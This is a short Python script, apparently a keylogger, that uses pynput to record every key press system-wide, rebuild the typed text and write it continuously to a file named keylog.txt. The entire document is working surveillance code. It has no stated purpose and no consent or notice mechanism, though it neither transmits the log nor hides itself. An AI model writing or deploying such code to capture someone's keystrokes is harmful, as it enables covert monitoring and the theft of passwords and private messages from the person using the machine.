from pynput.keyboard import Listener

text = ""

def show(key):

    global text

    if str(key)[0] == "'":
        cleaned_key = str(key).strip("'")
    else:
        cleaned_key = str(key).strip('"')

    if cleaned_key == "Key.space":
        cleaned_key = " "
    elif cleaned_key == "Key.enter":
        cleaned_key = "\n"
    elif cleaned_key == "Key.tab":
        cleaned_key = "\t"
    elif cleaned_key == "Key.backspace":
        text = text[:-1]
        cleaned_key = ""
    elif cleaned_key.split(".")[0] == "Key":
        cleaned_key = ""

    text += cleaned_key

    with open("keylog.txt", "w") as file:
        file.write(text)


with Listener(on_press = show) as listener:
    listener.join()

